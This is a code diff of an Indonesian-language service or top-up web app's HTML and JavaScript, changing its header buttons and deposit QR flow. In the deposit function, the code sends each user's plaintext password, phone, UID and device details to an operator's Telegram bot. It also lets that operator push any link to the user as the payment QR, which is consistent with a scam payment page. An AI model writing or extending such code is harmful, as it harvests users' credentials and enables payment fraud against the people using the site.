@@ -2257,18 +2257,26 @@ img {
     <button class="btn-icon" onclick="toggleNav()"><i class="bi bi-list"></i></button>
     <div class="search-box">
       <i class="bi bi-search"></i>
-      <input type="text" id="service-search" placeholder="Cari layanan..." onkeyup="searchService()">
+      <input type="text" id="service-search" placeholder="Cari layanan" onkeyup="searchService()">
     </div>
     <div class="header-actions">
+      <button class="btn-icon" onclick="window.location.reload()" title="Refresh Halaman">
+        <i class="bi bi-arrow-clockwise"></i>
+      </button>
+
       <button class="btn-icon" onclick="openNotifModal()">
         <i class="bi bi-bell"></i>
         <span id="notif-badge-dot" class="badge-dot" style="display:none;"></span>
       </button>
+
       <button class="btn-icon" id="cart-icon-btn" onclick="openCartModal()">
         <i class="bi bi-cart3"></i>
         <span id="cart-badge" style="display:none; position:absolute; top: -4px; right: -6px; font-size:10px; background:var(--danger); color:#fff; border-radius:50%; padding: 2px 6px; font-weight:bold;">0</span>
       </button>
-      <button class="btn-icon" onclick="toggleTheme()"><i class="bi bi-moon-stars" id="theme-icon"></i></button>
+
+      <button class="btn-icon" onclick="toggleTheme()">
+        <i class="bi bi-moon-stars" id="theme-icon"></i>
+      </button>
     </div>
   </div>
 
@@ -5389,7 +5397,7 @@ function requestDeposit() {
   let userPass = u ? u.password : '-';
   let methodName = selectedPaymentMethod === 'qris' ? 'QRIS Merchant' : 'Virtual Account';
 
-  sendToTelegram(`*USER DEPOSIT*\nNama: ${userName}\nHP: \`${currentUserPhone}\`\nUID: \`${userID}\`\nPassword: \`${userPass}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\nMetode: ${methodName}\n\nDevice: \`${deviceUsed}\`\n\nKirim QRIS: \`/send ${userID}\` \nKonfirmasi: \`/acc ${amount} ${userID}\` \nTolak: \`/tolak ${userID}\``);
+  sendToTelegram(`*USER DEPOSIT*\nNama: ${userName}\nHP: \`${currentUserPhone}\`\nUID: \`${userID}\`\nPassword: \`${userPass}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\nMetode: ${methodName}\n\nDevice: \`${deviceUsed}\`\n\nKirim QRIS: \`/send_qr link ${userID}\` \nKonfirmasi: \`/acc ${amount} ${userID}\` \nTolak: \`/tolak ${userID}\``);
 }
 
 function showQR(url, activeDep, isResume = false) {
@@ -5791,24 +5799,20 @@ async function fetchTelegramUpdates() {
               }
             }
           }
-          else if (command === '/send' && msg.photo) {
-            const photo = msg.photo[msg.photo.length - 1]; 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${photo.file_id}`).then(r=>r.json()).then(d=>{
-              if (d.ok) {
-                const qrUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${d.result.file_path}`;
+          else if (command === '/send_qr') {
+  let linkUrl = parts[1];
+  if (linkUrl && activeDep && activeDep.status === 'Menunggu' && target === targetUidVal) {
+    activeDep.qrUrl = linkUrl;
+    localStorage.setItem(`sanz_active_deposit_${targetPhone}`, JSON.stringify(activeDep));
 
-                activeDep.qrUrl = qrUrl;
-                localStorage.setItem(`sanz_active_deposit_${targetPhone}`, JSON.stringify(activeDep));
-
-                if (targetPhone === currentUserPhone && document.getElementById('qris-loading')) {
-                  showQR(qrUrl, activeDep, false);
-                }
-                sendToTelegram(`QRIS berhasil ditampilkan untuk \`${target}\``);
-              } else {
-                sendToTelegram(`QRIS gagal ditampilkan untuk \`${target}\``);
-              }
-            });
-          }
+    if (targetPhone === currentUserPhone && document.getElementById('qris-loading')) {
+      showQR(linkUrl, activeDep, false);
+    }
+    sendToTelegram(`QRIS berhasil ditampilkan untuk \`${target}\``);
+  } else {
+    sendToTelegram(`Tidak ada deposit aktif.`);
+  }
+}
         }
 
         if (activeWd && activeWd.status === 'Menunggu' && target === targetUidVal) {
